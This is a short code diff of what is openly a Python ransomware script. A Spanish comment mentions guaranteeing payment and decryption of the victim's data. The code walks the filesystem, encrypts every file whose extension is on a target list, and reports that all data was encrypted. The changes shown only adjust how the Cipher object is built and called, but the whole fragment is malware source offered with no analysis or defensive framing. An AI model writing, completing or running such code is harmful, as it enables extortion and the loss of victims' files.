@@ -17,7 +17,7 @@ import sys
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
 
 if __name__ == '__main__':
-    cipher = Cipher()
+    cipher = Cipher(action='encrypt')
     cipher.save_key_as_file(hidden=False)
 
     if not cipher.is_windows():
@@ -35,7 +35,7 @@ if __name__ == '__main__':
                 ext=cipher.get_file_extension(full_path)
                 if ext in cipher.TARGET_EXT and ext not in cipher.EXCLUDED_EXT:
                     print(full_path + ' -> [encrypted]')
-                    cipher.symmetric_encrypt_or_decrypt(full_path, cipher.key)
+                    cipher.symmetric_encrypt_or_decrypt(full_path)
 
     print('All data was successfully encrypted')
 
